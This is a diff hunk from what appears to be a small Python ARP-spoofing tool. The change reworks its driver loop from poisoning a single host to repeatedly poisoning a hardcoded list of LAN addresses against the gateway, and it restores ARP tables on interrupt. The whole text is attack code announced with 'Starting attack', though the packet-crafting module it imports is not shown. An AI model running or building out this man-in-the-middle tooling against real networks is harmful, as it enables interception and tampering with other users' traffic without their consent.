@@ -6,17 +6,23 @@ from ARP import arpPoison
 
 ipaddrs = ("192.168.1.116", "192.168.1.106")
 
-a = arpPoison("192.168.1.1", "192.168.1.116")
+a = arpPoison("192.168.1.1", "192.168.1.116", ipaddrs)
 
-a.setup()
+a.initialSetup()
 try:
     print("[-] Starting attack")
     while True:
+        # For single host:
         # Need both as it sends the spoofed ARP packets to both the router and endpoint
         #a.poisonHost()
         #a.poisonRouter()
 
-        # Need to figure out way to populate list without being hardcoded, perhaps through menu, data structure, regex or some kind of secondary script
-        a.poisonListOfHosts(ipaddrs)
+        # For multi-host:
+        a.poisonListOfHosts()
 except KeyboardInterrupt:
+    # Single host
+    #a.arpTableRestore()
+
+    # Multi-host
+    a.arpMultipleTableRestore()
     exit()
